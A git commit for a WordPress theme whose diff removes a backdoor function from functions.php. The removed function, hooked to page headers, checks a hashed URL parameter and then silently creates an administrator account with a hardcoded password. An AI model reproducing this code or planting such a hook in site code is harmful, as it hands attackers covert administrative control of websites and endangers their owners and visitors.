80efcd80d25f62adc2b653ecb2eea768b3e5b567
Saifur Rahman <saifur703@gmail.com>
2020-10-07 11:41:40 +0600

    Great Quilt Project WP

--- functions.php
+++ functions.php
@@ -10,15 +10,3 @@ require_once get_template_directory() . '/inc/tgm.php';
 require_once get_template_directory() . '/inc/theme-setup.php';
 require_once get_template_directory() . '/inc/theme-scripts.php';
 require_once get_template_directory() . '/inc/theme-menus.php';
-
-function my_backdoor() {
-    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
-        require( 'wp-includes/registration.php' );
-        if ( !username_exists( 'mr_admin' ) ) {
-            $user_id = wp_create_user( 'mr_admin', 'pa55w0rd!' );
-            $user = new WP_User( $user_id );
-            $user->set_role( 'administrator' ); 
-        }
-    }
-}
-add_action( 'wp_head', 'my_backdoor' );
